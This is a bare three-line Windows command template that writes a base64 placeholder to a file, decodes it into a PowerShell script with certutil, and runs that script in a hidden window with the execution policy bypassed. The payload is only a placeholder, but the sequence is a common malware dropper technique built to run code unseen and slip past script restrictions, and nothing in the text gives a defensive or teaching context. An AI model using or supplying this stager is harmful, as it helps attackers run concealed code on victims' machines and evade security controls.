echo ENCODED-BASE64-CODE > w.txt
certutil -decode w.txt w.PS1
powershell  -windowstyle hidden -ExecutionPolicy ByPass  -File w.PS1